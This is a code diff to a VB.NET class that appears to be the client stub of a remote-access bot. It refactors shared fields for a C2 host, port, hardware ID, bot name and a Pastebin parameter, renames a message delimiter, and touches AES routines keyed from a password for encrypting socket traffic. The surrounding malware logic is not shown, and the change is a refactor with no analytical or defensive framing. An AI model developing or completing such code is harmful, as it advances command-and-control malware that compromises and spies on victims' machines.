@@ -3,11 +3,21 @@ Imports System.Security.Cryptography
 
 Public Class Main
 
-
+    Public Shared C As TcpClient = Nothing
+    Public Shared ENDOF As String
+    Public Shared HOST As String
+    Public Shared PORT As Integer
+    Public Shared SPL As String
+    Public Shared PASS As String
+    Public Shared M As New IO.MemoryStream
+    Public Shared FULLPATH As String
+    Public Shared HWID As String
+    Public Shared BOT As String
+    Public Shared Pastebin As String
 
     Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
 
-        KEY = K
+        ENDOF = K
         HOST = H
         PORT = P
         SPL = SP
@@ -145,7 +155,7 @@ cc:
         Try
             Dim r As Object = New IO.MemoryStream
             r.Write(b, 0, b.Length)
-            r.Write(SB(KEY), 0, KEY.Length)
+            r.Write(SB(ENDOF), 0, ENDOF.Length)
             C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
             r.Dispose()
         Catch ex As Exception
@@ -173,7 +183,7 @@ cc:
         Dim encrypted As String = ""
         Try
             Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
             Array.Copy(temp, 0, hash, 0, 16)
             Array.Copy(temp, 0, hash, 15, 16)
             AES.Key = hash
@@ -192,7 +202,7 @@ cc:
         Dim decrypted As String = ""
         Try
             Dim hash(31) As Byte
-            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(PASS))
             Array.Copy(temp, 0, hash, 0, 16)
             Array.Copy(temp, 0, hash, 15, 16)
             AES.Key = hash
@@ -205,16 +215,6 @@ cc:
         End Try
     End Function
 
-    Public Shared C As TcpClient = Nothing
-    Public Shared KEY As String
-    Public Shared HOST As String
-    Public Shared PORT As Integer
-    Public Shared SPL As String
-    Public Shared PASS As String
-    Public Shared M As New IO.MemoryStream
-    Public Shared FULLPATH As String
-    Public Shared HWID As String
-    Public Shared BOT As String
-    Public Shared Pastebin As String
+
 
 End Class
